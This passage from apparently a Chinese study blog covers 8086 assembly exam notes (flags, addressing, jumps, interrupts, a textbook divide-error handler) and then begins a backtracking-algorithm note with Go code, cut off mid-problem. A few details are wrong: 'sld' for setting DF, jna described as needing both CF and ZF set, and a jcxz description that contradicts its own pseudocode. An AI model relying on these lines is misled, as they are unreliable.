1、3、5、12、13、14、15 位在 8086CPU 中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11 位都具有特殊的含义。</p><p>我们简单介绍CF、PF、ZF、SF、SF、OF、DF等标志位的作用。</p><table><thead><tr><th>标志寄存器</th><th>作用</th></tr></thead><tbody><tr><td>CF（Carry Flag，进位标志）</td><td>用于表示上一次算术运算是否产生了进位或借位。在加法运算中，如果结果超出了寄存器的大小，CF会被设置；在减法运算中，如果结果小于0，CF也会被设置。<strong>CF通常用于无符号数运算</strong></td></tr><tr><td>PF（Parity Flag，奇偶校验标志）</td><td>用于表示上一次操作结果的最低有效字节的奇偶性。如果结果的二进制表示中有偶数个1，则PF被设置为1，表示偶校验；如果有奇数个1，则PF被清除，表示奇校验。</td></tr><tr><td>ZF（Zero Flag，零标志）</td><td>如果上一次操作的结果为零，则ZF被设置。这个标志位常用于条件跳转指令，以检查操作是否没有产生任何影响。</td></tr><tr><td>SF（Sign Flag，符号标志）</td><td>用于表示上一次操作结果的符号。在有符号整数运算中，如果结果为负数，则SF被设置；如果结果为正数或零，则SF被清除。</td></tr><tr><td>OF（Overflow Flag，溢出标志）</td><td>用于表示上一次算术运算是否产生了溢出。在有符号整数运算中，如果结果超出了寄存器能够表示的最大或最小值，OF会被设置。<strong>OF专门用于有符号数运算</strong></td></tr><tr><td>DF（Direction Flag，方向标志）</td><td>用于控制字符串操作指令的方向。当DF被设置时，字符串操作会向内存的低地址方向进行；当DF被清除时，操作会向高地址方向进行。</td></tr><tr><td>AF（Auxiliary Carry Flag，辅助进位标志）</td><td>用于表示BCD（二进制编码的十进制）算术运算中的辅助进位。在BCD加法运算中，如果从低4位到高4位产生了进位，则AF会被设置。</td></tr><tr><td>IF（Interrupt Enable Flag，中断使能标志）</td><td>控制CPU是否应该响应外部和内部中断请求。如果IF被设置，CPU将允许中断；如果被清除，则CPU将忽略中断请求。</td></tr><tr><td>*TF（Trap Flag，陷阱标志）</td><td>当TF标志被设置时，CPU进入单步执行模式。在这种模式下，每执行一条指令后，CPU都会触发一个单步异常（单步陷阱），这通常用于调试目的。<strong>不常考察</strong>。</td></tr></tbody></table><p>相应的，也有许多配套的指令和标志寄存器相配合。</p><p>比如<code>adc</code>指令和<code>sbb</code>指令，和CF标志寄存器相关，分别对应实现8086CPU的借位加和借位减。内容比较冗杂，目前暂且先不介绍。</p><p><code>cmp</code>指令也很常用，和ZF标志寄存器相关。<code>cmp ax,bx</code>相当于对两个寄存器的值执行一次不改变寄存器的减法操作，用ZF记录结果的值是否为0。常常和<code>jz</code>条件转移指令连用。关于条件转移指令，可以参照下文[条件转移指令的介绍](# 条件转移指令)</p><p>DF寄存器常和串传送指令相关，用<code>cld</code>将DF置0，<code>sld</code>将DF置1。串传送十分重要，常被用来实现新断点例程的安装，参考如下代码段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">    start:  mov ax,cs</span><br><span class="line">            mov ds,ax</span><br><span class="line">            mov si,offset do0</span><br><span class="line"></span><br><span class="line">            mov ax,0</span><br><span class="line">            mov es,ax</span><br><span class="line">            mov di,200h</span><br><span class="line"></span><br><span class="line">            mov cx,offset do1-offset do0</span><br><span class="line">            cld</span><br><span class="line">            rep movsb ;等价于</span><br><span class="line">              ;s:movsb</span><br><span class="line">              ;  loop s</span><br><span class="line"></span><br><span class="line">            mov ax,0</span><br><span class="line">            mov es,ax</span><br><span class="line">            mov word ptr es:[0*4],200h</span><br><span class="line">            mov word ptr es:[0*4+2],0</span><br><span class="line"></span><br><span class="line">            mov ax,4c00h</span><br><span class="line">            int 21h</span><br><span class="line">    </span><br><span class="line">    do0:    jmp short do0start</span><br><span class="line">            db &quot;divide overflow!&quot;</span><br><span class="line"></span><br><span class="line">    do0start:</span><br><span class="line">            mov ax,cs</span><br><span class="line">            mov ds,ax</span><br><span class="line">            mov si,202h</span><br><span class="line"></span><br><span class="line">            mov ax,0b800h</span><br><span class="line">            mov es,ax</span><br><span class="line">            mov di,12*160+33*2;显示位置</span><br><span class="line"></span><br><span class="line">            mov cx,16;字符串长度</span><br><span class="line">    s:      mov al,[si]</span><br><span class="line">            mov es:[di],al</span><br><span class="line">            mov byte ptr es:[di+1],0c0h;显示属性,红底白字</span><br><span class="line">            inc si</span><br><span class="line">            add di,2</span><br><span class="line">            loop s</span><br><span class="line"></span><br><span class="line">            mov ax,4c00h</span><br><span class="line">            int 21h</span><br><span class="line">    do1:    nop</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>最后，就是<code>pushf</code>与<code>popf</code>。这两条指令分别代表将标志寄存器的值入栈和从栈中弹出数据送入标志寄存器内。</p><h2 id="内存地址定位与寻址方式"><a class="markdownIt-Anchor" href="#内存地址定位与寻址方式"></a> 内存地址定位与寻址方式</h2><p>各种寄存器的知识已经介绍完毕，接下来我们就可以来谈谈8086CPU几种不同的寻址方式。</p><p>下图总结的十分全面：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/6c45b64b47604c3ca24174cf53f983ab.png" alt="在这里插入图片描述" style="zoom: 80%;" /><p>寻址方式一共有五种：直接寻址（立即数）、间接寻址（单寄存器）、相对寻址（单寄存器加立即数）、基址变址寻址（寄存器加寄存器）、相对基址变址寻址（寄存器加寄存器加立即数）。</p><p>能参与寻址的段寄存器有ds、ss、es；能参与寻址的偏移寄存器有bx、si、di（都默认ds）、bp（默认ss）。</p><p>对于8086CPU的指令，可以处理两种尺寸的数据——Byte和Word。为了让机器知道进行字操作还是字节操作，我们需要用操作符<code>X ptr</code>来指明长度。<code>X</code>可以是word或者byte。例子如下：</p><ul><li><p><code>mov word ptr ds:[0],1</code></p></li><li><p><code>inc byte ptr [bx]</code></p></li><li><p><code>div word ptr [bx+8]</code></p><p>ax = (dx * 10000h +ax) / (ds * 16 + bx +8)的商</p><p>dx = (dx * 10000h +ax) / (ds * 16 + bx +8)的余数</p></li><li><p><code>div byte ptr [bx+8]</code></p><p>al = ax / (ds * 16 + bx +8)的商</p><p>ah = ax / (ds * 16 + bx +8)的余数</p></li></ul><h2 id="深入转移指令"><a class="markdownIt-Anchor" href="#深入转移指令"></a> 深入转移指令</h2><p>看到这里，基本的内存访问方法已经差不多搞清楚，接下来就该上点强度了。在高级语言编程时，函数是至关重要的一环。它允许用户开辟一块新的代码段，封装一个功能方便用户调用，大大提高了代码的可读性和封装性。在汇编中，函数过程的调用对应的是转移指令，即<strong>可以修改IP，或同时修改CS和IP的指令</strong>。</p><p>在8086CPU中，转移指令分为以下几类：</p><ul><li>无条件转移指令（<code>jmp</code>）</li><li>条件转移指令（<code>jz</code>、<code>jne</code>等）</li><li>循环指令（<code>loop</code>）</li><li>过程（<code>call</code>、<code>ret</code>等）</li><li>中断（<code>int</code>、<code>iret</code>等）</li></ul><p>接下来我们来逐一介绍这些转移指令的用法。</p><h3 id="修改范围"><a class="markdownIt-Anchor" href="#修改范围"></a> 修改范围</h3><p>在进入具体的指令介绍前，我们先了解指令转移行为的类别，这个规律对大部分转移指令都适用：</p><ul><li>只修改IP，称为段内转移，如：<code>jmp ax</code></li><li>同时修改CS和IP，称为段间转移,如：<code>jmp 1000:0</code></li></ul><p>段内转移又分为：短转移和近转移。</p><p>短转移的IP修改范围为-128~127（IP+8位位移），近转移的修改范围为-32768~32767（IP+16位位移）。短跳转通常用于小范围内的循环或条件语句，近跳转则用于更复杂的流程控制，如跳转到程序的其他部分。</p><h3 id="jmp指令"><a class="markdownIt-Anchor" href="#jmp指令"></a> jmp指令</h3><p><code>jmp</code>是最长使用的无条件跳转指令，有以下几种用法：</p><ul><li><code>jmp short 标号</code>执行段内短跳转。</li><li><code>jmp near ptr 标号</code>执行段内近跳转，是默认的使用方式，等价于<code>jmp 标号</code>。</li><li><code>jmp far ptr 标号</code>执行段间转移，也称远转移。该指令用标号的段地址和偏移地址修改CS:IP。</li><li><code>jmp 16位reg</code>等价于段内近跳转。</li><li><code>jmp word ptr 内存单元地址</code>等价于执行段内短跳转。</li><li><code>jmp dword ptr 内存单元地址</code>执行段间转移，高地址的字储存转移的目的段地址修改CS，低地址的字储存转移的目的偏移地址修改IP。即CS = 内存单元地址 + 2，IP = 内存单元地址</li></ul><h3 id="条件转移指令"><a class="markdownIt-Anchor" href="#条件转移指令"></a> 条件转移指令</h3><p>条件转移指令常常以字母J开头，比如<code>jcxz</code>，<code>jz</code>等。我们对这些繁琐而简短的指令做一个汇总方便记忆</p><p><code>jcxz</code>（jump if cx zero）指令是有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含的都是标号的位移而非其目的地址。</p><p><code>jcxz 标号</code>将检测cx是否为0，如果不为0则跳转至目标标号执行。等同于：<code>if cx==0 &#123;jmp short 标号&#125;</code>。</p><p>可以用<code>jcxz</code>代替<code>loop</code>实现循环：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dec cx</span><br><span class="line">jcxz 标号</span><br></pre></td></tr></table></figure><p>除<code>jcxz</code>外，下面的指令都是标志寄存器相关的转移指令。</p><table><thead><tr><th>指令</th><th>含义</th><th>检测的相关标志位</th></tr></thead><tbody><tr><td>je/jz</td><td>等于(0)则转移</td><td>zf=1</td></tr><tr><td>jne</td><td>不等于则转移</td><td>zf=0</td></tr><tr><td>jb</td><td>低于则转移</td><td>cf=1</td></tr><tr><td>jnb</td><td>不低于则转移</td><td>cf=0</td></tr><tr><td>ja</td><td>高于则转移</td><td>cf=0且zf=0</td></tr><tr><td>jna</td><td>不高于则转移</td><td>cf=1且zf=1</td></tr><tr><td>jle</td><td>小于等于则转移</td><td>sf=zf</td></tr></tbody></table><p>更多的条件转移指令塞到本章有些过于繁琐，所以我只节选了教材上提到过的条件转移指令，应付考试应该绰绰有余了，其他的资料就留待日后扩展吧。</p><h3 id="loop指令"><a class="markdownIt-Anchor" href="#loop指令"></a> loop指令</h3><p><code>loop</code>是循环指令，所有的循环指令都是短转移。</p><p>调用<code>loop 标号</code>指令时，会执行以下操作：</p><ol><li><p>CX = CX - 1</p></li><li><p>CX==0 ? 执行下一条指令 : jmp 标号</p><p>即检查CX的值是否为0，如果为0则退出循环，否则跳转回标号继续循环。</p></li></ol><p>更具体的介绍可以参照cx寄存器的资料。</p><h3 id="call与ret"><a class="markdownIt-Anchor" href="#call与ret"></a> call与ret</h3><p><code>call</code>和<code>ret</code>可以视为函数的调用与返回指令。一般的流程是先调用<code>call</code>，CPU将当前的（此时IP已经指向<code>call</code>的下一条指令）IP或者CS与IP入栈，然后跳转到目的地址执行，最后再通过<code>ret</code>或者<code>retf</code>返回原来的地址。</p><p><code>call</code>指令和<code>jmp</code>类似，本质上就是先入栈再跳转，所以用法也类似：</p><ul><li><p><code>call 标号</code>等价于：</p><p><code>push IP</code></p><p><code>jmp near ptr 标号</code></p></li><li><p><code>call far ptr 标号</code>等价于：</p><p><code>push CS</code></p><p><code>push IP</code></p><p><code>jmp far ptr 标号</code></p></li><li><p><code>call 16位reg</code>等价于：</p><p><code>push IP</code></p><p><code>jmp 16位reg</code></p></li><li><p><code>call word ptr 内存单元地址</code>等价于：</p><p><code>push IP</code></p><p><code>jmp word ptr 内存单元地址</code></p></li><li><p><code>call dword ptr 内存单元地址</code>等价于：</p><p><code>push CS</code></p><p><code>push IP</code></p><p><code>jmp dword ptr 内存单元地址</code></p></li></ul><p><code>ret</code>指令有许多变种，依次归纳如下：</p><ul><li><p><code>ret</code>指令实现近转移，等价于：</p><p><code>pop IP</code></p></li><li><p><code>retf</code>指令实现远转移，等价于：</p><p><code>pop IP</code></p><p><code>pop CS</code></p></li><li><p><code>iret</code>指令实现远转移，用于处理中断程序的返回，等价于：</p><p><code>pop IP</code></p><p><code>pop CS</code></p><p><code>popf</code></p></li></ul><h2 id="中断"><a class="markdownIt-Anchor" href="#中断"></a> 中断</h2><p>中断是8086CPU的一种能力，这让它能够在执行完当前的指令后，检测到CPU外部发送过来的特殊信息（如断电、键盘输入等），立即去执行其他的指令，而不去接着执行下一条指令。中断分为内中断和外中断两种，重点是内中断；而外中断因为涉及到过多的硬件知识所以简单介绍，只讨论键盘外设的输入及端口。</p><h3 id="内中断"><a class="markdownIt-Anchor" href="#内中断"></a> 内中断</h3><p>一般来说，8086CPU有如下四种中断：</p><ol><li>除法错误，比如<code>div 0</code>，本质上是调用了<code>int 0</code>号中断</li><li>单步执行，在debug模式下</li><li>执行<code>into</code>指令</li><li>执行<code>int</code>指令</li></ol><p>我们着重介绍第四种情况。</p><h4 id="中断的过程"><a class="markdownIt-Anchor" href="#中断的过程"></a> 中断的过程</h4><p><code>int</code>指令是如何执行中断程序的呢？</p><p>我们前文提到，<code>int</code>指令也是一种转移指令，那么也就意味着，在执行完对应的中断程序后，CPU还需要跳转回原来的指令继续执行（当然也可能直接终止程序了）。此时的做法和<code>call</code>类似，在跳转至中断程序前，需要先把此时的CS:IP入栈，然后再进行跳转。</p><p>储存好CS:IP后，CPU用8位的中断类型码跳转至中断向量表，找到中断程序的入口地址，再跳转至真正的中断程序执行。中断类型码，即<code>int 类型码</code>，我们常说的0号中断就是类型码为0。因为中断类型码只有8位，这就意味着中断向量表只能储存256个中断程序。而这其中大部分的中断类型码其实都没有使用，这就给我们拓展CPU的功能留下了空间。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240612112356153.png" alt="image-20240612112356153" style="zoom:80%;" /><p>在8086CPU中，中断向量表储存在内存地址0处。从内存0000:0000到0000:03FF共1024个字节中都用来存放中断向量表。在中断向量表中，一个表项存放一个中断向量，也就是中断程序的入口地址。一共占两个字，高地址字存放入口地址的段地址，低地址字存放偏移地址。</p><blockquote><p>加深记忆</p><p>1024Byte = 512Word = 256 入口地址 = 256/2<sup>8</sup>个例程 = 8位类型码</p></blockquote><p>对中断程序入口地址的考察也是一个常考点，例题如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240612113309849.png" alt="image-20240612113309849" style="zoom: 50%;" /><p>更简洁的描述中断过程如下：</p><ol><li>取得中断类型码N</li><li><code>pushf</code></li><li>TF=0，IF=0（将在下一章讨论）</li><li><code>push CS</code></li><li><code>push IP</code></li><li>IP=4N，CS=4N+2</li></ol><p>更具体的中断例程的调用不用记忆，比如BIOS和DOS提供的中断程序调用，题目一般会直接给出资料。</p><p>下面再给出BIOS提供中断例程的资料拓展，可能会作为材料选择题考察。</p><blockquote><p>在系统板的 ROM 中存放着一套程序，称为 BIOS(基本输入输出系统)，BIOS 中主要包含以下几部分内容。</p><ol><li>硬件系统的检测和初始化程序</li><li>外部中断和内部中断的中断例程</li><li>用于对硬件设备进行 I/O 操作的中断例程</li><li>其他和硬件系统相关的中断例程</li></ol><p>CPU在启动时，会先安装BIOS提供的中断例程，再转去启动DOS，具体步骤如下：</p><ol><li>开机后，CPU 一加电，初始化(CS)=0FFFFH，(IP)=0，自动从 FFFF:0 单元开始执行程序。FFFF:0 处有一条转跳指令，CPU 执行该指令后，转去执行 BIOS 中的硬件系统检测和初始化程序。</li><li>初始化程序将建立 BIOS 所支持的中断向量，即将 BIOS 提供的中断例程的入口地址登记在中断向量表中。注意，对于 BIOS 所提供的中断例程，只需将入口地址登记在中断向量表中即可，因为它们是固化到 ROM 中的程序，一直在内存中存在。</li><li>硬件系统检测和初始化完成后，调用int 19h 进行操作系统的引导。从此将计算机交由操作系统控制。</li><li>DOS 启动后，除完成其他工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量。</li></ol></blockquote><h3 id="外中断"><a class="markdownIt-Anchor" href="#外中断"></a> 外中断</h3><p>外中断即是由外部设备输入CPU产生的中断信息，我们先简单的介绍一下端口的概念，介绍CPU与外设的基本通信方式，再讨论外中断。</p><h4 id="端口"><a class="markdownIt-Anchor" href="#端口"></a> 端口</h4><p>CPU可以直接读写以下3个地方的数据：</p><ol><li>CPU内部的寄存器</li><li>内存单元</li><li>端口</li></ol><p>端口实际上是一组接口芯片，它们既可以控制接口卡进行工作，还可以利用芯片自带的可供CPU读写的寄存器储存CPU发来的信息。从CPU的角度来讲，它都把这些寄存器当做端口进行统一编址，从而建立一个统一的端口地址空间，每一个端口空间在地址空间中都有一个地址，这样CPU就可以通过访问地址的方式访问端口从而和外设建立起通信。</p><p>因为端口所在的芯片和CPU通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。最多可以定位64kb个不同的端口，即端口的范围为0~65535。</p><p>在汇编中，则是通过<code>in</code>和<code>out</code>指令来调用端口。用法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;对0~255以内的端口进行读写时</span><br><span class="line">in al,20h  ;从20h端口读入一个字节</span><br><span class="line">out 20h,al ;从20h端口写入一个字节</span><br><span class="line">;对256~65535的端口进行读写时</span><br><span class="line">mov dx,3f8h;将端口号送入dx</span><br><span class="line">in al,dx   ;从3f8h端口读入一个字节</span><br><span class="line">out dx,al  ;从3f8h端口写入一个字节</span><br></pre></td></tr></table></figure><p>注意，在<code>in</code>和<code>out</code>指令中，只能用ax或al来存放从端口中读入的数据或者发送到端口的数据。访问8位端口时用al，16位端口用ax。</p><h4 id="外中断响应信息"><a class="markdownIt-Anchor" href="#外中断响应信息"></a> 外中断响应信息</h4><p>介绍完端口通信的内容，我们就要引入对于外中断来说一个重要的概念：可屏蔽中断与不可屏蔽中断。</p><h5 id="可屏蔽中断"><a class="markdownIt-Anchor" href="#可屏蔽中断"></a> 可屏蔽中断</h5><p>可屏蔽中断是 CPU 可以不响应的外中断。CPU 是否响应可屏蔽中断，要看标志寄存器的IF位的设置。当 CPU 检测到可屏蔽中断信息时，如果 IF=1，则 CPU 在执行完当前指令后响应中断，引发中断过程；如果IF=0，则不响应可屏蔽中断。</p><p>过程如下：</p><ol><li>取中断类型码n</li><li><code>pushf</code>，IF=0，TF=0</li><li><code>push CS</code>，<code>push IP</code></li><li>IP = 4 * n，CS = 4 * n + 2</li></ol><p>可屏蔽中断通常使用<code>sti</code>和<code>cli</code>指令来处理。</p><ul><li><code>sti</code>，设置标志寄存器IF=1，此时可以响应可屏蔽外中断</li><li><code>cli</code>，设置标志寄存器IF=0，此时禁止响应所有的可屏蔽中断</li></ul><p>可屏蔽中断所引发的中断过程，除在第1步的实现上有所不同外，基本上和内中断的中断过程相同。因为可屏蔽中断信息来自于 CPU 外部，中断类型码是通过数据总线送入CPU 的；而内中断的中断类型码是在 CPU 内部产生的。</p><p>现在，我们可以解释中断过程中将IF置为0的原因了。将IF置0的原因就是，在进入中断处理程序后，禁止其他的可屏蔽中断。</p><p>常见的考点是，在考察安装新的键盘<code>int 9h</code>中断时，在处理地址时要先用<code>cli</code>关闭相应可屏蔽中断，在地址更改完毕后再用<code>sti</code>恢复响应。这是为了防止在设置<code>int 9h</code>中断例程地址时发生键盘中断，导致CPU转去一个错误的地址执行。</p><h5 id="不可屏蔽中断"><a class="markdownIt-Anchor" href="#不可屏蔽中断"></a> 不可屏蔽中断</h5><p>不可屏蔽中断是 CPU 必须响应的外中断。当 CPU 检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。比如电脑掉电就是一个不可屏蔽中断。</p><p>对于 8086CPU，不可屏蔽中断的中断类型码固定为 2，所以中断过程中，不需要取中断类型码。则不可屏蔽中断的中断过程为：</p><ol><li><code>pushf</code>，IF=0，TF=0</li><li><code>push CS</code>，<code>push IP</code></li><li>IP = 4 * 2 = 8，CS = 4 * 2 + 2 = 0AH</li></ol><p>我们主要讨论可屏蔽中断，不可屏蔽中断仅做了解就好。</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><p>因为是理论课总结，考虑到有同学没有选修实验课，所以这里减少了有关实验部分的知识点。</p><p>关于直接定址表和使用BIOS进行键盘输入与磁盘读写的内容，虽然在实验部分比较重要，但是在理论上考察却很容易理解或者不会考察，所以这里没有总结。</p><p>那么，本总结就到此为止啦，祝大家汇编考试分数++</p><ul><li>将小写字母的ASCII码减去20H可以得到对应的大写字母ASCII码，在处理大小写转换时很常用。</li></ul><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/106476729_p0.jpg" alt="106476729_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
            <tag> 8086 </tag>
            
            <tag> 期末考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法笔记之遍历搜索</title>
      <link href="/posts/39d66e106197/"/>
      <url>/posts/39d66e106197/</url>
      
        <content type="html"><![CDATA[<p>本篇文章主要总结一下笔者学习的两种算法：回溯法和分支限界法。这两种算法其实在OI界中很少用到，因为简单粗暴，本质上就是暴力+剪枝。两者都是暴力搜索的一种方法，只不过分别对应二叉树遍历中的DFS和BFS思想。为什么会联系到二叉树呢？<strong>因为一个可以用回溯法或分支限界法解决的问题，实际上就是一个决策树的遍历过程。</strong></p><p>那么我们逐一详细介绍一下两种算法。</p><h1 id="回溯法"><a class="markdownIt-Anchor" href="#回溯法"></a> 回溯法</h1><p>前文提到，解决回溯问题，实际上就是一个<strong>决策树</strong>的遍历过程。</p><blockquote><p>Q：什么是决策树？</p><p>A：决策树（Decision Tree）是一种常用的数据结构，也是一种常见的机器学习模型。在这个上下文中，我们可以将决策树理解为一个图，其中每个节点代表一个决策，每个边代表基于该决策的结果。根节点（root）代表初始状态，叶节点（leaf）代表决策结果。</p><p>在回溯法中，决策树被用来枚举所有可能的解决方案。每个节点代表一个部分解决方案，每个边代表一个选择，从根节点到叶节点的路径代表一个完整的解决方案。回溯法通过深度优先搜索（DFS）策略，进行决策树的遍历，寻找所有可能的解决方案。</p><p>例如，假设我们正在解决一个简单的迷宫问题。我们可以将每个位置视为一个决策（向上、向下、向左或向右移动），并将整个迷宫视为一个决策树。然后，我们可以使用回溯法来遍历这个决策树，找到从入口到出口的路径。</p></blockquote><p>那么我们只需要搞懂三个问题，就能把握住问题的核心：</p><ol><li>路径：就是已经做出的选择</li><li>选择列表：就是你在当前节点可以做出的选择</li><li>结束条件：就是你到达决策树底层，无法再继续做选择的条件。（也可以是一些额外的约束条件，用于剪枝减少选择提高算法效率）</li></ol><p>代码方面，回溯问题的伪代码框架大致如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">路径, 选择列表</span>):</span><br><span class="line">    <span class="keyword">if</span> 满足结束条件:</span><br><span class="line">        result.add(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表:</span><br><span class="line">    <span class="comment"># 做选择</span></span><br><span class="line">    将该选择从选择列表移除</span><br><span class="line">    路径.add(选择)</span><br><span class="line">    backtrack(路径, 选择列表)</span><br><span class="line">    <span class="comment"># 撤销选择</span></span><br><span class="line">    路径.remove(选择)</span><br><span class="line">    将该选择再加入选择列表</span><br></pre></td></tr></table></figure><p>回溯算法代码的核心，就是一个for循环中的递归。<strong>首先检查结束条件，决定是否退出；如果没有退出，就在递归调用之前，「做选择」；在递归调用之后「撤销选择」</strong>。就是这么简单。</p><p>接下来用两个问题来理解回溯法：全排列和N皇后问题。</p><h2 id="全排列"><a class="markdownIt-Anchor" href="#全排列"></a> 全排列</h2><blockquote><p><a href="https://leetcode.cn/problems/permutations/description/">46. 全排列 - 力扣（LeetCode）</a></p><p>给定一个不含重复数字的数组 <code>nums</code> ，返回其 <em>所有可能的全排列</em> 。你可以 <strong>按任意顺序</strong> 返回答案。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3]</span><br><span class="line">输出：[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span><br></pre></td></tr></table></figure></blockquote><p>我们抛开算法来看，自己想想怎么对三个数进行全排列：首先固定1不变，排列2,3和3,2；然后固定2为第一个元素，排列1,3和3,1；最后固定3为第一个元素，排列1,2和2,1。</p><p>这种穷举的思想，就是一个决策树的过程。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/v2-9732f159a7aab4bcb8f335feb9af086f_r.jpg" alt="img" /></p><p>你可以把<em>选择列表</em>与<em>属性</em>视为节点的两个属性，每个节点都储存着你做出这个选择时的情况。定义的<code>backtrack</code>函数更像是一个指针，在决策树上用<code>DFS</code>的遍历方式游走，同时要不断的正确维护每个节点的属性。当我们走到决策树的底层时，我们走过的<code>路径</code>就是一个全排列。</p><h3 id="为什么要撤销选择"><a class="markdownIt-Anchor" href="#为什么要撤销选择"></a> 为什么要撤销选择？</h3><p>正如我们前文提到的，要在决策树游走，需要我们正确的维护每一个决策节点的属性。</p><p>每当我们做出一个决策，我们就做出了一个选择：也就是改变了<strong>路径</strong>。那么，当我们走到这个选择的决策树底层，回到该节点时，需要恢复原路径信息，这样我们才能在不受干扰的条件下做出另一个选择。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/v2-5db74cc959cbe4ad136f41e638653e33_b.jpg" alt="img" /></p><p>那我们可以不撤销选择吗？<strong>也可以。</strong></p><p>我们之所以要撤销选择，是因为我们更改了节点的信息。但如果我们每次做选择时都生成一个节点的副本，在这上面进行的改变不会影响到原有节点，此时就不需要进行选择撤回操作。但是这么做需要给遍历到的每个节点都创建一个副本，带来的空间开销很大，不利于函数的性能。</p><p>那么用回溯法解决问题的思路就很显而易见了：首先我们做出选择，然后进入到下一层决策树继续选择；如果track列表中出现了重复的数字，说明该数字已经被选择过，丢弃该选择；如果最后路径列表的长度等于全排列的长度，说明排列已完成，返回路径结束递归。</p><p>代码如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 全排列</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">permute</span><span class="params">(nums []<span class="type">int</span>)</span></span> [][]<span class="type">int</span> &#123;</span><br><span class="line">res := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">track := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">var</span> backtrack <span class="function"><span class="keyword">func</span><span class="params">(nums []<span class="type">int</span>, track []<span class="type">int</span>)</span></span></span><br><span class="line">backtrack = <span class="function"><span class="keyword">func</span><span class="params">(nums []<span class="type">int</span>, track []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//结束条件 路径和初始的选择列表长度相同，说明已经全部排列完成</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(track) == <span class="built_in">len</span>(nums) &#123;</span><br><span class="line">res = <span class="built_in">append</span>(res, <span class="built_in">append</span>([]<span class="type">int</span>&#123;&#125;, track...))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line"><span class="comment">//排除不合法的选择</span></span><br><span class="line"><span class="keyword">if</span> contains(track, nums[i]) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//做选择</span></span><br><span class="line">track = <span class="built_in">append</span>(track, nums[i])</span><br><span class="line"><span class="comment">//进入下一层决策树</span></span><br><span class="line">backtrack(nums, track)</span><br><span class="line"><span class="comment">//取消选择</span></span><br><span class="line">track = track[:<span class="built_in">len</span>(track)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">backtrack(nums, track)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">contains</span><span class="params">(slice []<span class="type">int</span>, item <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="comment">//检查切片中是否包含指定的元素</span></span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> slice &#123;</span><br><span class="line"><span class="keyword">if</span> a == item &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>必须说明的是，不管怎么优化，都符合<a href="https://www.zhihu.com/search?q=%E5%9B%9E%E6%BA%AF%E6%A1%86%E6%9E%B6&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2293530380%22%7D">回溯框架</a>，而且时间复杂度都不可能低于 O(N!)，因为穷举整棵决策树是无法避免的。<strong>这也是回溯算法的一个特点，不像动态规划存在重叠子问题可以优化，回溯算法就是纯暴力穷举，复杂度一般都很高</strong>。</p><h2 id="n皇后"><a class="markdownIt-Anchor" href="#n皇后"></a> N皇后</h2><blockquote><p><a href="https://leetcode.cn/problems/n-queens/description/">51. N 皇后 - 力扣（LeetCode）</a></p><p>按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。</p><p><strong>n 皇后问题</strong> 研究的是如何将 <code>n</code> 个皇后放置在 <code>n×n</code> 的棋盘上，并且使皇后彼此之间不能相互攻击。</p><p>给你一个整数 <code>n</code> ，返回所有不同的 <strong>n 皇后问题</strong> 的解决方案。</p><p>每一种解法包含一个不同的 <strong>n 皇后问题</strong> 的棋子放置方案，该方案中 